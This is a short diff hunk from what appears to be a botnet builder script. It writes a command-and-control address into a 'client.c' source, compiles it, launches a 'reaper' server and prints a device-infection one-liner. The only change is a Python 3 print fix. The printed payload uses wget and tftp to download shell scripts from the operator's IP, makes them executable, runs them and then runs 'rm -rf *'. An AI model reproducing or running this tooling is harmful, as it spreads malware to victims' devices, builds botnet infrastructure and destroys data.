@@ -34,4 +34,4 @@ jack('client.c', 35, 'unsigned char *commServer[] = {"'+ ip +':'+ bport +'"};\n'
 cri('echo '+ user +' '+ passw +' >> reaper.txt')
 cri('python cc7.py client.c '+ ip +'')
 cri('screen ./reaper '+ bport +' 1 '+ port +'')
-print '\x1b[1;35mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *'
+print ('\x1b[1;35mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *')
